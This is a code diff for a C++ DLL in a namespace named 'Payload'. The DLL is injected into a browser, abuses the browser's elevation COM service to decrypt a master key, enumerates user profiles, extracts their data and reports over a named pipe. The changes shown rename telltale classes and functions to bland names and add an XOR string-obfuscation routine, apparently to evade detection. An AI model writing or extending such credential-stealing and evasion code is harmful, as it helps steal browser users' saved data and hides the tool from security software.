@@ -74,7 +74,17 @@ IEdgeElevatorFinal : public IEdgeIntermediateElevator{};
 
 namespace Payload
 {
-    class PipeLogger;
+    class DataLogger;
+    
+    // String obfuscation helpers
+    inline std::string DecryptStr(const char* str, size_t len, uint8_t key) {
+        std::string result;
+        result.reserve(len);
+        for (size_t i = 0; i < len; ++i) {
+            result += static_cast<char>(str[i] ^ key);
+        }
+        return result;
+    }
 
     namespace Utils
     {
@@ -402,15 +412,15 @@ namespace Payload
         }
     }
 
-    class PipeLogger
+    class DataLogger
     {
     public:
-        PipeLogger(LPCWSTR pipeName)
+        DataLogger(LPCWSTR pipeName)
         {
             m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
         }
 
-        ~PipeLogger()
+        ~DataLogger()
         {
             if (m_pipe != INVALID_HANDLE_VALUE)
             {
@@ -464,7 +474,7 @@ namespace Payload
     class MasterKeyDecryptor
     {
     public:
-        MasterKeyDecryptor(PipeLogger &logger) : m_logger(logger)
+        MasterKeyDecryptor(DataLogger &logger) : m_logger(logger)
         {
             if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
             {
@@ -534,14 +544,14 @@ namespace Payload
         }
 
     private:
-        PipeLogger &m_logger;
+        DataLogger &m_logger;
         bool m_comInitialized = false;
     };
 
     class ProfileEnumerator
     {
     public:
-        ProfileEnumerator(const fs::path &userDataRoot, PipeLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}
+        ProfileEnumerator(const fs::path &userDataRoot, DataLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}
 
         std::vector<fs::path> FindProfiles()
         {
@@ -584,14 +594,14 @@ namespace Payload
 
     private:
         fs::path m_userDataRoot;
-        PipeLogger &m_logger;
+        DataLogger &m_logger;
     };
 
     class DataExtractor
     {
     public:
         DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
-                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
+                      const std::vector<uint8_t> &aesKey, DataLogger &logger,
                       const fs::path &baseOutputPath, const std::string &browserName)
             : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
               m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}
@@ -672,15 +682,15 @@ namespace Payload
         fs::path m_profilePath;
         const Data::ExtractionConfig &m_config;
         const std::vector<uint8_t> &m_aesKey;
-        PipeLogger &m_logger;
+        DataLogger &m_logger;
         fs::path m_baseOutputPath;
         std::string m_browserName;
     };
 
-    class DecryptionOrchestrator
+    class DataProcessingManager
     {
     public:
-        DecryptionOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
+        DataProcessingManager(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
         {
             if (!m_logger.isValid())
             {
@@ -730,7 +740,7 @@ namespace Payload
             m_outputPath = buffer;
         }
 
-        PipeLogger m_logger;
+        DataLogger m_logger;
         fs::path m_outputPath;
     };
 }
@@ -741,7 +751,7 @@ struct ThreadParams
     LPVOID lpPipeNamePointerFromInjector;
 };
 
-DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
+DWORD WINAPI DataProcessingRoutine(LPVOID lpParam)
 {
     LPCWSTR lpcwstrPipeName = static_cast<LPCWSTR>(lpParam);
 
@@ -750,14 +760,14 @@ DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
 
     try
     {
-        Payload::DecryptionOrchestrator orchestrator(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
+        Payload::DataProcessingManager orchestrator(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
         orchestrator.Run();
     }
     catch (const std::exception &e)
     {
         try
         {
-            Payload::PipeLogger errorLogger(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
+            Payload::DataLogger errorLogger(static_cast<LPCWSTR>(thread_params->lpPipeNamePointerFromInjector));
             if (errorLogger.isValid())
             {
                 errorLogger.Log("[-] CRITICAL DLL ERROR: " + std::string(e.what()));
